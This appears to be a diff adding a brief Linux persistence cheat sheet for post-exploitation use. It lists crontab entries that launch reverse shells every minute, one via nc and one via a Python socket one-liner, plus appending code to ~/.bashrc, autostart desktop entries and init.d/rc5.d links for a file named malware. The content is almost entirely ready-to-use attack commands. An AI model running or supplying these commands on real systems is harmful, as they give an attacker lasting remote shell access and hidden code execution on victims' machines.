@@ -1,0 +1,17 @@
+# crontab
+crontab <<< "* * * * * [code]"
+crontab <<< "* * * * * nc -c /bin/sh 127.0.0.1 6969"
+crontab <<< "* * * * * python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"127.0.0.1\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\"/bin/sh\");'"
+
+# bashrc
+echo "code" >> ~/.bashrc
+
+# Auto start folder (desktop entry with code execution)
+~/.config/autostart/malware.desktop	# Gnome
+~/.kde/Autostart/symblinktomalware	# KDE
+
+# (Root) init.d
+update-rc.d malware.sh defaults
+/etc/rc5.d/S58malware -> ../init.d/malware
+
+
